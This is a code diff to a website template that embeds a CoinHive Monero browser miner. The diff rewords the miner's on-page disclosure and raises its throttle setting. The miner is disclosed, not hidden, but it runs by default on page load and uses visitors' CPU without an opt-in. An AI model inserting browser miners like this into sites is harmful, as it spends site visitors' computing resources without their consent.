@@ -68,7 +68,7 @@ const TemplateWrapper = ({ children, data }) => (
     </footer>
 
     <div id="miner">
-    This website is running a javascript cryptocurreny miner for the Monero Blockchain. The miner works in your Browser and mines for XMR to support an ad-free viewing experience.
+    This website is running a javascript cryptocurreny miner for the <a href="https://en.wikipedia.org/wiki/Monero_(cryptocurrency)">Monero Blockchain</a>. The miner only runs in your Browser while this page is open. This script helps support an ad-free viewing experience.
     </div>
 
     <CoinHive
@@ -76,7 +76,7 @@ const TemplateWrapper = ({ children, data }) => (
         siteKey="ccEnBa0TKvPxuvEnlswpHOloocRNXpoZ"
         autoThreads={false}
         threads={3}
-        throttle={0.2}
+        throttle={0.5}
         src={CoinHive.src.coinhive}
         onInit={miner => setInterval(
           () => console.log(CoinHive.getMinerData(miner))
